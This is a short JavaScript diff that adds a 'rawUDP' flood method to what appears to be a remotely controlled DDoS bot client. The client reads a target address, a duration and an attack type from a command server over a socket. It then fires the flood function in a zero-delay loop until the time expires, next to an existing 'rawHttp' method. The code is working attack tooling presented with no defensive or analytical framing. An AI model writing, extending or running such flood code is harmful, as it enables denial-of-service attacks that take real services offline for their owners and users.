@@ -1,5 +1,6 @@
 module.exports.run = (async function (){
     const rawHttp = require('./Scripts/rawHttp')
+    const rawUDP = require('./Scripts/rawUDP')
     var net = require('net');
     var client = new net.Socket();
     const mainServer = require('./index')
@@ -50,6 +51,17 @@ module.exports.run = (async function (){
                 let URL_IP = data[1];
                 let Time = data[2];
                 let Type = data[3];
+                if(Type === "rawUDP")
+                {
+                    let running = true;
+                    setTimeout(() => {
+                        running = false;
+                    }, Time);
+                    var interval = setInterval(() => {
+                        if(!running) clearInterval(interval)
+                        rawUDP.start(URL_IP)
+                    }, 0);
+                }
                 if(Type === "rawHttp")
                 {
                     let running = true;
